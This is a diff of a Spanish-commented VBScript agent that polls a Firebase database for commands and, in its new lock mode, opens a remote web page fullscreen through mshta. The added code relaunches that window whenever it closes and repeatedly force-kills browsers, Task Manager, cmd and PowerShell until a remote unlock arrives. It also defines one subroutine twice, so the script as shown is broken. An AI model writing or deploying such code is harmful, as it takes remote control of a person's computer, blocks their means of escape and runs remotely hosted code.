@@ -1,8 +1,8 @@
 
 Option Explicit
 
-Dim BASE_URL : BASE_URL = "https://cmdapp-e276d-default-rtdb.europe-west1.firebasedatabase.app"
-Dim POLL_MS : POLL_MS = 5000 ' cada 5s (Poll normal)
+Dim BASE_URL : BASE_URL = "https://hello-74404-default-rtdb.europe-west1.firebasedatabase.app"
+Dim POLL_MS : POLL_MS = 10000 ' cada 10s (Reducción de consumo)
 
 Dim WshShell, WshNetwork, FSO
 Dim logFilePath 
@@ -145,35 +145,111 @@ Function CheckGlobalLock()
 End Function
 
 Sub LockedLoop()
-    LogWrite "MODO BLOQUEO ACTIVO: Cerrando browsers cada 1s..."
+    LogWrite "MODO BLOQUEO ESTRICTO: Iniciando..."
+    
+    Dim lockUrl : lockUrl = "https://logise1.github.io/cmd/locked.html"
+    
+    ' Matar todo lo que pueda molestar al inicio
+    KillInteractiveApps
+    
+    ' Lanzar MSHTA Pantalla Completa (Más difícil de cerrar que Chrome)
+    OpenHTAKiosk lockUrl
+    
     Dim unlockCmd
-    Dim firstRun : firstRun = True
+    Dim dbUnlock
     
     Do
         On Error Resume Next
-        ' Usar taskkill /F para forzar cierre
-        WshShell.Run "taskkill /im chrome.exe /f", 0, False
-        WshShell.Run "taskkill /im msedge.exe /f", 0, False
+        WScript.Sleep 10000 ' Ciclo relajado cada 10s
         
-        ' Verificar si se ha eliminado el bloqueo en DB (Método 1: Frontend borra nodo)
-        If CheckGlobalLock() = False Then
-             LogWrite "Desbloqueo detectado (DB Cleared). Saliendo de modo bloqueo."
-             Exit Do
-        End If
+        ' 1. Check Desbloqueo
+        dbUnlock = False
+        If CheckGlobalLock() = False Then dbUnlock = True
         
-        ' Verificar si llega comando /unlock explicito (Método 2: Comando)
-        ' Esto es necesario si el frontend envía comando en vez de borrar el nodo
         unlockCmd = CheckForUnlockCommand()
         If unlockCmd = True Then
-             LogWrite "Desbloqueo detectado (Comando /unlock). Saliendo de modo bloqueo."
-             UnlockMachine ' Borrar nodo manualmente porsiacaso
-             Exit Do
+             UnlockMachine 
+             dbUnlock = True
         End If
         
+        If dbUnlock Then Exit Do
+        
+        ' 2. Persistencia HTA
+        If Not IsProcessRunning("mshta.exe") Then
+            LogWrite "Candado cerrado -> Relanzando HTA..."
+            OpenHTAKiosk lockUrl
+        End If
+        
+        ' 3. RESTRICCIÓN TOTAL: Matar apps interactivas continuamente
+        KillInteractiveApps
+        
         UpdateHeartbeat GetEpochTime()
-        WScript.Sleep 1000
     Loop
+    
+    ' Salida: Matar HTA y restaurar
+    WshShell.Run "taskkill /im mshta.exe /f", 0, False
+    ' Opcional: Relanzar explorer si se mató (descomentar si se decide matar explorer)
+    ' WshShell.Run "explorer.exe", 0, False 
+    LogWrite "Bloqueo finalizado."
 End Sub
+
+Sub KillInteractiveApps()
+    On Error Resume Next
+    ' Matar navegadores
+    WshShell.Run "taskkill /im chrome.exe /f", 0, False
+    WshShell.Run "taskkill /im msedge.exe /f", 0, False
+    WshShell.Run "taskkill /im firefox.exe /f", 0, False
+    ' Matar herramientas de sistema
+    WshShell.Run "taskkill /im Taskmgr.exe /f", 0, False
+    WshShell.Run "taskkill /im cmd.exe /f", 0, False
+    WshShell.Run "taskkill /im powershell.exe /f", 0, False
+    ' Matar explorador (Opcional: muy agresivo, deja pantalla negra salvo el Kiosco)
+    ' WshShell.Run "taskkill /im explorer.exe /f", 0, False 
+End Sub
+
+Sub OpenHTAKiosk(url)
+    On Error Resume Next
+    ' Usamos MSHTA puro.
+    ' Para que salga pantalla completa, el HTML debería tener tags HTA, pero como es remoto,
+    ' lanzamos MSHTA maximizado.
+    ' Truco: Usar javascript dentro de mshta para redimensionar a screen.width/height y mover a 0,0
+    
+    Dim cmd
+    ' Construimos un comando que abre una ventana HTA en blanco que luego navega a la URL
+    ' y se pone fullscreen.
+    ' Nota: mshta.exe url carga la url. Windows recuerda el tamaño.
+    ' Forzamos maximizado con VBS wrapper inline o simplemente confiamos en el usuario.
+    
+    ' Método robusto: Lanza mshta con la URL directamente.
+    ' Si la web sale vacía es porque mshta usa motor IE antiguo (IE7 mode por defecto).
+    ' Hay que forzar modo standards. Pero eso depende del HTML remoto (<meta http-equiv="X-UA-Compatible" content="IE=edge" />)
+    
+    WshShell.Run "mshta """ & url & """", 3, False ' 3 = Maximized
+End Sub
+
+Sub OpenChromeKiosk(url)
+    On Error Resume Next
+    ' Usamos Chrome para el bloqueo visual
+    CreateObject("WScript.Shell").Run "chrome.exe --new-window --kiosk """ & url & """", 0, False
+End Sub
+
+Sub OpenChromeKiosk(url)
+    On Error Resume Next
+    ' Usamos Chrome para el bloqueo visual
+    CreateObject("WScript.Shell").Run "chrome.exe --new-window --kiosk """ & url & """", 0, False
+End Sub
+
+Function IsProcessRunning(procName)
+    On Error Resume Next
+    IsProcessRunning = False
+    Dim colItems, objItem
+    Set colItems = GetObject("winmgmts:\\.\root\cimv2").ExecQuery("Select * from Win32_Process Where Name = '" & procName & "'")
+    For Each objItem in colItems
+        IsProcessRunning = True
+        Exit For
+    Next
+    Set colItems = Nothing
+End Function
 
 Function CheckForUnlockCommand()
     On Error Resume Next
